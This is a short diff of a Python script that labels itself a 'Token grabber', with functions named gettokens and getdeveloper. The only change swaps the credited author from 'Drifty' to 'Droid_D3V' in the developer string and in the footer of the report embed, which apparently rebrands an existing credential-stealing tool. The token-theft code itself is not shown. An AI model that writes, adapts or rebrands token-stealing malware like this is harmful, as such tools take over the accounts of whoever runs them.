@@ -61,7 +61,7 @@ def gettokens(path):
 
 # Dev
 def getdeveloper():
-    dev = "Drifty"
+    dev = "Droid_D3V"
     try:
         dev = urlopen(Request("")).read().decode()
     except:
@@ -202,7 +202,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token grabber by Drifty"
+                    "text": f"Token grabber by Droid_D3V"
                 }
             }
             embeds.append(embed)
